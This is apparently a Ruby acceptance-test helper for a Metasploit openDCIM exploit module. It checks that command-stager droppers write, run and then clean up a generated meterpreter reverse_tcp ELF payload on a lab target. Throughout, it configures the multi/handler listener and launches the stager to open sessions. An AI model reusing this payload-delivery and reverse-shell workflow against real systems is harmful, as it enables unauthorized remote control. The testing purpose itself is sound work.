# frozen_string_literal: true

require_relative '../opendcim_sessions/acceptance'

# Architecture readiness and real file bytes gate each actual dropper path.
module OpenDcimDropperSessions
  include OpenDcimSessions

  def dropper_arch
    self.class.metadata.fetch(:dropper_arch)
  end

  def dropper_flavor
    self.class.metadata.fetch(:dropper_flavor)
  end

  def session_families
    { 'linux-' + dropper_arch => [1, 'linux/' + dropper_arch + '/meterpreter/reverse_tcp', 'meterpreter'] }
  end

  def session_default_options
    { 'linux-x64' => ['PAYLOAD'] }
  end

  def session_owner_options(options)
    result = super.merge('CMDSTAGER::TEMP' => @dropper_directory)
    result['CMDSTAGER::FLAVOR'] = dropper_flavor unless dropper_flavor == 'printf' && options.fetch('AutoCheck')
    result
  end

  def dropper_empty
    output, = rc_command('dropper-directory-contents', 'target', 'find', @dropper_directory, '-mindepth', '1', '-maxdepth', '1', '-print')
    expect(output).to eq('')
  end

  def dropper_ready
    os_ready
    @dropper_directory = "/tmp/module-target-opendcim-dropper-#{Process.pid}-#{dropper_arch}-#{dropper_flavor}"
    session_host_command('create-dropper-directory', *session_exec_argv('mkdir', '-m', '700', @dropper_directory))
    @rc[:dropper_directory] = @dropper_directory
    dropper_empty
    @rc[:dropper_observer] = rc_json("begin;load 'test/module_targets/opendcim_dropper_x64/observe.rb';load 'test/module_targets/saltstack_deployer/session_control.rb';OpenDcimDropperObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @rc[:runtime] = rc_json("{ruby:RUBY_VERSION,payload_gems:Gem.loaded_specs.select{|name,_|name.include?('payload')||name=='rex-exploitation'}.transform_values{|spec|spec.version.to_s}}")
    @rc[:dropper_prepared] = true
    rc_save
  end

  def native_session(family)
    _target, payload, = session_families.fetch(family)
    attempt = { family: family, owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    path = "/tmp/module-target-opendcim-native-#{Process.pid}-#{family}"
    log_path = path + '-output'
    expect(file(path)).to include('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => LaravelSessions::CALLBACK_PORT, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60, 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 }.each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    expect(attempt.fetch(:handler_output)).not_to include('Exploit failed', 'Exploit aborted')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;SaltDeploymentSessionControl.executable(job,#{payload.inspect},framework);end")
    attempt[:generated] = generated
    bytes = Base64.strict_decode64(generated.fetch('executable_base64'))
    verify_elf(bytes)
    stager = rc_json("begin;require 'msf/core/exploit/cmd_stager';stock=Msf::Exploit::CmdStager::STAGERS.fetch(#{dropper_flavor.to_sym.inspect}).new(Base64.strict_decode64(#{generated.fetch('executable_base64').inspect}));commands=stock.generate(temp:#{@dropper_directory.inspect});{commands:commands,paths:OpenDcimDropperObservation.paths(stock)};end")
    attempt[:native_stager] = stager
    script = stager.fetch('commands').join("\n")
    command = session_exec_argv('sh', '-c', 'cat > "$1" && chmod 600 "$1" && sha256sum "$1"', 'native-stager-script', path)
    output, error, status = Open3.capture3(*command, stdin_data: script)
    attempt[:install] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(Digest::SHA256.hexdigest(script))
    attempt[:physical_script] = file(path)
    expect(attempt.fetch(:physical_script)).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(script.b))
    command = session_exec_argv('sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, 'sh', path, detached: true)
    output, error, status = Open3.capture3(*command)
    attempt[:launch] = { argv: command, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    await_session(payload, 'exploit/multi/handler')
    attempt[:physical_native_files] = stager.fetch('paths').transform_values { |entry| file(entry) }
    decoded = dropper_flavor == 'printf' ? 'elf' : 'decoded'
    expect(attempt.fetch(:physical_native_files).fetch(decoded)).to eq('exists' => true, 'uid' => 33, 'base64' => generated.fetch('executable_base64'))
    if dropper_flavor == 'bourne'
      expect(Base64.strict_decode64(attempt.fetch(:physical_native_files).fetch('encoded').fetch('base64'))).to eq(Base64.strict_encode64(bytes))
    end
    use_session(family, attempt, 'exploit/multi/handler')
    dropper_empty
    expect(stager.fetch('paths').transform_values { |entry| file(entry).fetch('exists') }.values).to all(be(false))
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      rc_command('remove-native-executable', 'target', 'rm', '-f', '--', path, log_path) if path
      expect(file(path)).to include('exists' => false) if path
      expect(file(log_path)).to include('exists' => false) if log_path
      cleanup_session
      @rc[:calibrated] << family if passed
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def verify_elf(bytes)
    expect(bytes.byteslice(0, 4)).to eq("\x7fELF".b)
    expect(bytes.getbyte(4)).to eq(dropper_arch == 'x64' ? 2 : 1)
    expect(bytes.byteslice(18, 2).unpack1('v')).to eq(dropper_arch == 'x64' ? 62 : 3)
  end

  def use_session(family, attempt, owner)
    if owner == laravel_owner
      values = rc_json('framework.instance_variable_get(:@opendcim_dropper_events)')
      events = values.drop(@rc.fetch(:dropper_cursor, 0))
      @rc[:dropper_cursor] = values.length
      attempt[:dropper_events] = events
      rc_save
      executable = events.find { |row| row['method'] == 'generate_payload_exe' }
      stager = events.find { |row| row['method'] == 'generate_cmdstager' }
      expect(executable).not_to be_nil
      expect(stager).not_to be_nil
      bytes = Base64.strict_decode64(executable.fetch('executable_base64'))
      verify_elf(bytes)
      expect(executable.fetch('fork')).to be(false)
      expect(stager.fetch('flavor')).to eq(dropper_flavor)
      expect(stager.fetch('executable_sha256')).to eq(executable.fetch('sha256'))
      paths = stager.fetch('paths')
      expect(paths.values).not_to be_empty
      paths.each_value do |path|
        expect(File.dirname(path)).to eq(@dropper_directory)
        expect(File.basename(path)).to match(/\A[A-Za-z]{5}(?:\.b64)?\z/)
      end
      await_session(session_families.fetch(family)[1], owner)
      attempt[:physical_dropper_files] = paths.transform_values { |path| file(path) }
      decoded = dropper_flavor == 'printf' ? 'elf' : 'decoded'
      expect(attempt.fetch(:physical_dropper_files).fetch(decoded)).to eq('exists' => true, 'uid' => 33, 'base64' => executable.fetch('executable_base64'))
      if dropper_flavor == 'bourne'
        expect(attempt.fetch(:physical_dropper_files).fetch('encoded')).to include('exists' => true, 'uid' => 33)
        expect(Base64.strict_decode64(attempt.fetch(:physical_dropper_files).fetch('encoded').fetch('base64'))).to eq(Base64.strict_encode64(bytes))
      end
    end
    result = super
    if owner == laravel_owner
      dropper_empty
      expect(stager.fetch('paths').transform_values { |path| file(path).fetch('exists') }.values).to all(be(false))
      attempt[:normal_stager_cleanup_verified] = true
    end
    result
  ensure
    rc_save
  end

  def owner_session(family)
    super
    actual = @rc.fetch(:calls).last.fetch(:events).filter_map { |row| row['command_base64'] }
    generated = @rc.fetch(:attempts).select { |row| row[:owner] == laravel_owner }.flat_map do |attempt|
      attempt.fetch(:dropper_events).find { |row| row['method'] == 'generate_cmdstager' }.fetch('commands')
    end
    expect(actual).to eq(generated.map { |command| Base64.strict_encode64((command + ' #').b) })
  end
end
